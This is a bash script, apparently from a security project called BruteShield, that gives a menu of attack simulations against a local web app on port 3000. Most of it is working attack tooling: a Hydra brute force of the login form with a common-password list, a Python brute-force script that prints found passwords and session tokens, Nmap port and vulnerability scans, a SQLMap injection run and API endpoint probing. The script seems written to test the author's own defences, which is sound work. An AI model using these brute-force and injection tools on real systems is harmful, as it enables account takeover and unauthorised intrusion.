#!/bin/bash

# BruteShield Attack Examples for Kali Linux
# WARNING: Only use on systems you own or have permission to test

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   BruteShield - Kali Linux Attack Examples               ║"
echo "║   Educational Use Only - Use Responsibly                 ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# Configuration
TARGET_IP="localhost"
TARGET_PORT="3000"
TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}"

echo "Target: ${TARGET_URL}"
echo ""

# Function to display menu
show_menu() {
    echo "Select an attack simulation:"
    echo "1. Brute Force Attack (Hydra)"
    echo "2. Brute Force Attack (Python Script)"
    echo "3. Network Port Scan (Nmap)"
    echo "4. SQL Injection Test (SQLMap)"
    echo "5. API Enumeration"
    echo "6. Create Test User"
    echo "7. Exit"
    echo ""
    read -p "Enter your choice [1-7]: " choice
}

# 1. Brute Force with Hydra
brute_force_hydra() {
    echo ""
    echo "=== Brute Force Attack with Hydra ==="
    echo ""
    
    # Create password list
    cat > /tmp/passwords.txt << 'EOF'
password
password123
admin
admin123
test123
letmein
qwerty
123456
welcome
test1234
EOF
    
    read -p "Enter target email address: " email
    
    echo ""
    echo "Starting Hydra brute force attack..."
    echo "Password list: /tmp/passwords.txt"
    echo ""
    
    # Hydra attack
    hydra -l "$email" -P /tmp/passwords.txt \
        "${TARGET_IP}" http-post-form \
        "/api/login:email=^USER^&password=^PASS^:{\"message\":\"Invalid credentials\"}" \
        -V -f -t 4
    
    echo ""
    echo "Attack completed. Check the output above for results."
    echo ""
}

# 2. Python Brute Force Script
brute_force_python() {
    echo ""
    echo "=== Python Brute Force Script ==="
    echo ""
    
    cat > /tmp/brute_force.py << 'PYEOF'
#!/usr/bin/env python3
import requests
import time
import sys

TARGET_URL = "http://localhost:3000/api/login"

# Common passwords
passwords = [
    "password", "password123", "admin", "admin123",
    "test123", "letmein", "qwerty", "123456",
    "welcome", "test1234", "P@ssw0rd", "admin@123"
]

def brute_force(email):
    print(f"\n[*] Starting brute force attack on: {email}")
    print(f"[*] Target URL: {TARGET_URL}")
    print(f"[*] Testing {len(passwords)} passwords...\n")
    
    for i, password in enumerate(passwords, 1):
        try:
            response = requests.post(
                TARGET_URL,
                json={"email": email, "password": password},
                timeout=5
            )
            
            status = "✓" if response.status_code == 200 else "✗"
            print(f"[{i}/{len(passwords)}] {status} Testing: {password:20} | Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                print(f"\n[SUCCESS] Password found: {password}")
                print(f"[SUCCESS] Token: {data.get('token', 'N/A')[:50]}...")
                return True
            
            # Handle account lockout
            if response.status_code == 423:
                print(f"\n[WARNING] Account locked! Server response:")
                print(f"{response.json()}")
                return False
            
            # Respect rate limiting
            time.sleep(0.5)
            
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Request failed: {e}")
            
    print(f"\n[FAILED] No valid password found in the list.")
    return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        email = sys.argv[1]
    else:
        email = input("Enter target email: ")
    
    brute_force(email)
PYEOF
    
    chmod +x /tmp/brute_force.py
    
    read -p "Enter target email address: " email
    
    echo ""
    echo "Running Python brute force script..."
    echo ""
    
    python3 /tmp/brute_force.py "$email"
    
    echo ""
}

# 3. Network Port Scan
port_scan() {
    echo ""
    echo "=== Network Port Scan with Nmap ==="
    echo ""
    
    echo "Scanning ${TARGET_IP}..."
    echo ""
    
    # Basic scan
    nmap -sV -p- "${TARGET_IP}"
    
    echo ""
    echo "Vulnerability scan..."
    echo ""
    
    # Vulnerability scan
    nmap --script vuln "${TARGET_IP}"
    
    echo ""
}

# 4. SQL Injection Test
sql_injection() {
    echo ""
    echo "=== SQL Injection Test with SQLMap ==="
    echo ""
    
    read -p "Enter test email: " email
    read -p "Enter test password: " password
    
    echo ""
    echo "Running SQLMap..."
    echo ""
    
    sqlmap -u "${TARGET_URL}/api/login" \
        --data="email=${email}&password=${password}" \
        --batch --level=3 --risk=2
    
    echo ""
}

# 5. API Enumeration
api_enumeration() {
    echo ""
    echo "=== API Enumeration ==="
    echo ""
    
    echo "Testing common API endpoints..."
    echo ""
    
    endpoints=(
        "/api/register"
        "/api/login"
        "/api/user-profile"
        "/api/simulations"
        "/api/results"
        "/api/attack-logs"
        "/api/dashboard/stats"
    )
    
    for endpoint in "${endpoints[@]}"; do
        url="${TARGET_URL}${endpoint}"
        status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
        
        if [ "$status" -eq 401 ] || [ "$status" -eq 403 ]; then
            echo "[$status] ${endpoint} - Protected (Requires Auth)"
        elif [ "$status" -eq 200 ]; then
            echo "[$status] ${endpoint} - Accessible"
        else
            echo "[$status] ${endpoint}"
        fi
    done
    
    echo ""
}

# 6. Create Test User
create_test_user() {
    echo ""
    echo "=== Create Test User ==="
    echo ""
    
    read -p "Enter name: " name
    read -p "Enter email: " email
    read -p "Enter password: " password
    
    echo ""
    echo "Creating user..."
    echo ""
    
    response=$(curl -s -X POST "${TARGET_URL}/api/register" \
        -H "Content-Type: application/json" \
        -d "{\"name\":\"${name}\",\"email\":\"${email}\",\"password\":\"${password}\"}")
    
    echo "Response:"
    echo "$response" | python3 -m json.tool 2>/dev/null || echo "$response"
    echo ""
}

# Main loop
while true; do
    show_menu
    
    case $choice in
        1) brute_force_hydra ;;
        2) brute_force_python ;;
        3) port_scan ;;
        4) sql_injection ;;
        5) api_enumeration ;;
        6) create_test_user ;;
        7) 
            echo ""
            echo "Exiting... Stay safe and hack responsibly!"
            echo ""
            exit 0
            ;;
        *)
            echo ""
            echo "Invalid choice. Please try again."
            echo ""
            ;;
    esac
    
    read -p "Press Enter to continue..."
    clear
done
